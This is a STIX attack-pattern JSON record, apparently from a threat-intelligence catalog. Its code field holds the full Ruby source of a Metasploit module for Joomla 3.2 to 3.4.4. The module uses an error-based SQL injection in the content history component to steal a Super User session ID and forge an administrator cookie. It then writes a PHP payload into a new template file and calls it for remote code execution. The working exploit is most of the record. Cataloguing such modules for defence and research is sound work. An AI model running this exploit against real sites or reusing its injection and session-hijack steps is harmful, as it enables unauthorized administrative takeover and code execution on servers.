{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b5a26583-7910-48cc-9b3e-b77b06cf9a23",
    "created": "2024-08-14T17:13:34.474132Z",
    "modified": "2024-08-14T17:13:34.474135Z",
    "name": "\"Joomla Content History SQLi Remote Code Execution\"",
    "description": " This module exploits a SQL injection vulnerability found in Joomla versions 3.2 up to 3.4.4. The vulnerability exists in the Content History administrator component in the core of Joomla. Triggering the SQL injection makes it possible to retrieve active Super User sessions. The cookie can be used to login to the Joomla administrator backend. By creating a new template file containing our payload, remote code execution is made possible.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/joomla_contenthistory_sqli_rce.rb",
            "external_id": "joomla_contenthistory_sqli_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/"
        },
        {
            "source_name": "reference",
            "url": "http://developer.joomla.org/security-centre/628-20151001-core-sql-injection.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Joomla Content History SQLi Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits a SQL injection vulnerability found in Joomla versions\n        3.2 up to 3.4.4. The vulnerability exists in the Content History administrator\n        component in the core of Joomla. Triggering the SQL injection makes it possible\n        to retrieve active Super User sessions. The cookie can be used to login to the\n        Joomla administrator backend. By creating a new template file containing our\n        payload, remote code execution is made possible.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Asaf Orpani', # Vulnerability discovery\n          'xistence <xistence[at]0x90.nl>' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2015-7857' ], # Admin session hijacking\n          [ 'CVE', '2015-7297' ], # SQLi\n          [ 'CVE', '2015-7857' ], # SQLi\n          [ 'CVE', '2015-7858' ], # SQLi\n          [ 'URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/' ],\n          [ 'URL', 'http://developer.joomla.org/security-centre/628-20151001-core-sql-injection.html' ]\n        ],\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          # Arbitrary big number. The payload gets sent as POST data, so\n          # really it's unlimited\n          'Space'       => 262144, # 256k\n        },\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          [ 'Joomla 3.x <= 3.4.4', {} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2015-10-23',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The base path to Joomla', '/'])\n        ])\n\n  end\n\n  def check\n\n    # Request using a non-existing table\n    res = sqli(rand_text_alphanumeric(rand(10)+6))\n\n    if res && res.body =~ /`(.*)_ucm_history`/\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n\n  end\n\n\n  def sqli( tableprefix )\n\n    # SQLi will only grab Super User sessions with a valid username and userid (else they are not logged in).\n    # The extra search for NOT LIKE '%IS NOT NULL%' is because of our SQL data that's inserted in the session cookie history.\n    # This way we make sure that's excluded and we only get real admin sessions.\n\n    sql = \" (select col.a from (select count(*), concat(0x3a, 0x3a, (select substr(session_id,1,100) from #{tableprefix}session WHERE data LIKE '%Super User%' AND data NOT LIKE '%IS NOT NULL%' AND userid!='0' AND username IS NOT NULL limit 0,1), 0x3a, 0x3a, floor(rand()*2)) a from information_schema.columns i1 group by a) col),'A' union select uc.id \"\n\n    # Retrieve cookies\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, \"index.php\"),\n      'vars_get' => {\n        'option' => 'com_contenthistory',\n        'view' => 'history',\n        'list[ordering]' => '',\n        'item_id' => '1',\n        'type_id' => '1',\n        'list[select]' => sql\n        }\n      })\n\n    return res\n\n  end\n\n\n  def exploit\n\n    # Request using a non-existing table first, to retrieve the table prefix\n    res = sqli(rand_text_alphanumeric(rand(10)+6))\n\n    if res && res.code == 500 && res.body =~ /`(.*)_ucm_history`/\n      table_prefix = $1\n      print_status(\"#{peer} - Retrieved table prefix [ #{table_prefix} ]\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Error retrieving table prefix\")\n    end\n\n    # Retrieve the admin session using our retrieved table prefix\n    res = sqli(\"#{table_prefix}_\")\n\n    if res && res.code == 500 && res.body =~ /::([A-Za-z0-9]*)::/\n      auth_cookie_part = $1\n      print_status(\"#{peer} - Retrieved admin cookie [ #{auth_cookie_part} ]\")\n    else\n      fail_with(Failure::Unknown, \"#{peer}: No logged-in admin user found!\")\n    end\n\n    # Retrieve cookies\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, \"administrator\", \"index.php\")\n    })\n\n    if res && res.code == 200 && res.get_cookies =~ /^([a-z0-9]+)=[a-z0-9]+;/\n      cookie_begin = $1\n      print_status(\"#{peer} - Retrieved unauthenticated cookie [ #{cookie_begin} ]\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Error retrieving unauthenticated cookie\")\n    end\n\n    # Modify cookie to authenticated admin\n    auth_cookie = cookie_begin\n    auth_cookie << \"=\"\n    auth_cookie << auth_cookie_part\n    auth_cookie << \";\"\n\n    # Authenticated session\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, \"administrator\", \"index.php\"),\n      'cookie'  => auth_cookie\n      })\n\n    if res && res.code == 200 && res.body =~ /Administration - Control Panel/\n      print_good(\"#{peer} - Successfully authenticated as Administrator\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Session failure\")\n    end\n\n\n    # Retrieve template view\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, \"administrator\", \"index.php\"),\n      'cookie'  => auth_cookie,\n      'vars_get' => {\n        'option' => 'com_templates',\n        'view' => 'templates'\n        }\n      })\n\n    # We try to retrieve and store the first template found\n    if res && res.code == 200 && res.body =~ /\\/administrator\\/index.php\\?option=com_templates&amp;view=template&amp;id=([0-9]+)&amp;file=([a-zA-Z0-9=]+)/\n      template_id = $1\n      file_id = $2\n    else\n      fail_with(Failure::Unknown, \"Unable to retrieve template\")\n    end\n\n    filename = rand_text_alphanumeric(rand(10)+6)\n\n    # Create file\n    print_status(\"#{peer} - Creating file [ #{filename}.php ]\")\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, \"administrator\", \"index.php\"),\n      'cookie'  => auth_cookie,\n      'vars_get' => {\n        'option' => 'com_templates',\n        'task' => 'template.createFile',\n        'id' => template_id,\n        'file' => file_id,\n        },\n      'vars_post' => {\n        'type' => 'php',\n        'name' => filename\n      }\n      })\n\n    # Grab token\n    if res && res.code == 303 && res.headers['Location']\n      location = res.headers['Location']\n      print_status(\"#{peer} - Following redirect to [ #{location} ]\")\n      res = send_request_cgi(\n        'uri'    => location,\n        'method' => 'GET',\n        'cookie' => auth_cookie\n      )\n\n      # Retrieving template token\n      if res && res.code == 200 && res.body =~ /&amp;([a-z0-9]+)=1\\\">/\n        token = $1\n        print_status(\"#{peer} - Token [ #{token} ] retrieved\")\n      else\n        fail_with(Failure::Unknown, \"#{peer} - Retrieving token failed\")\n      end\n\n      if res && res.code == 200 && res.body =~ /(\\/templates\\/.*\\/)template_preview.png/\n        template_path = $1\n        print_status(\"#{peer} - Template path [ #{template_path} ] retrieved\")\n      else\n        fail_with(Failure::Unknown, \"#{peer} - Unable to retrieve template path\")\n      end\n\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Creating file failed\")\n    end\n\n    filename_base64 = Rex::Text.encode_base64(\"/#{filename}.php\")\n\n    # Inject payload data into file\n    print_status(\"#{peer} - Insert payload into file [ #{filename}.php ]\")\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, \"administrator\", \"index.php\"),\n      'cookie'  => auth_cookie,\n      'vars_get' => {\n        'option' => 'com_templates',\n        'view' => 'template',\n        'id' => template_id,\n        'file' => filename_base64,\n        },\n      'vars_post' => {\n        'jform[source]' => payload.encoded,\n        'task' => 'template.apply',\n        token => '1',\n        'jform[extension_id]' => template_id,\n        'jform[filename]' => \"/#{filename}.php\"\n      }\n      })\n\n    if res && res.code == 303 && res.headers['Location'] =~ /\\/administrator\\/index.php\\?option=com_templates&view=template&id=#{template_id}&file=/\n      print_status(\"#{peer} - Payload data inserted into [ #{filename}.php ]\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Could not insert payload into file [ #{filename}.php ]\")\n    end\n\n    # Request payload\n    register_files_for_cleanup(\"#{filename}.php\")\n    print_status(\"#{peer} - Executing payload\")\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, template_path, \"#{filename}.php\"),\n      'cookie'  => auth_cookie\n    })\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-10-23",
    "x_mitre_platforms": [
        "['php']"
    ]
}